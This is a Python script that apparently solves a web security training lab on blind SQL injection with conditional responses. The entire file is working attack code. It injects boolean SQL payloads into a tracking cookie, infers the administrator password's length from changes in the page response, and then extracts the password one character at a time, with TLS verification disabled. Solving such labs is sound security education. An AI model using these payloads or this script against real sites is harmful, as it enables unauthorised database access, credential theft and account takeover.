#!/usr/bin/env python3

# Script to extract data using blind SQL injection
# Lab: Blind SQL injection with conditional responses

import requests
import string
import sys
import urllib3

from dictionary_traverser import DictionaryTraverser

### CONFIGURE THESE VALUES ###
host = "<your_host>.web-security-academy.net"
path = ""
valid_cookie = "TrackingId=<your_tracking_id>; session=<your_session_id>"
dictionary = string.digits + string.ascii_lowercase #+ string.ascii_uppercase +
##############################

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def decompose_cookie(cookie):
	(tracking_id_part, session_part) = cookie.split()
	tracking_id = tracking_id_part[tracking_id_part.index('=')+1:tracking_id_part.index(';')]
	session_id = session_part[session_part.index('=')+1:]
	return (tracking_id, session_id)

def make_cookie(tracking_id, session_id, payload):
	return "TrackingId=%s; session=%s" % (tracking_id + requests.utils.quote(payload), session_id)

def is_valid_session(cookie):
	url = "https://{host}/{path}".format(host=host, path=path)
	#proxies = {"https":"https://127.0.0.1:8080"}
	headers = {
	"Cookie": cookie,
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
	}
	response = requests.get(url, headers=headers, verify=False)
	return "Welcome back!" in response.text

def determine_password_length(tracking_id, session_id):
	password_length = 0
	for i in range(1, 40):
		payload = "' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>{l} AND '3'='3".format(l=i)
		payloaded_cookie = make_cookie(tracking_id, session_id, payload)
		if (not is_valid_session(payloaded_cookie)):
			password_length = i
			break
	if password_length > 0:
		print("Determined the password length - {l}".format(l=password_length))
		return password_length
	else:
		raise Exception("Unable to determine password length")

def determine_password(tracking_id, session_id, password_length):
	password = ""
	for i in range(0, password_length):
		dt = DictionaryTraverser(dictionary)
		while(True):
			(c, left_size, right_size) = dt.get_random_split()
			payload = "' AND SUBSTRING((SELECT password from users where username='administrator'),{i},1) > '{c}".format(i=i+1,c=c)
			payloaded_cookie = make_cookie(tracking_id, session_id, payload)
			if (is_valid_session(payloaded_cookie)):
				if (right_size > 1):
					dt.dict = dt.right
				elif (right_size == 1):
					guessed_char = dt.right[0]
					password += guessed_char
					break
				else:
					guessed_char = c
					password += guessed_char
					print("Current password: {p}".format(p=password))
					break
			else:
				# left size should always include the 'c' character
				if (left_size==0):
					guessed_char = c
					password += guessed_char
					print("Current password: {p}".format(p=password))
					break
				else:
					dt.dict = dt.left + c
	return password

if __name__ == "__main__":
	(tracking_id, session_id) = decompose_cookie(valid_cookie)
	password_length = determine_password_length(tracking_id, session_id)
	password = determine_password(tracking_id, session_id, password_length)
	print("Finished. Password is {p}".format(p=password))
	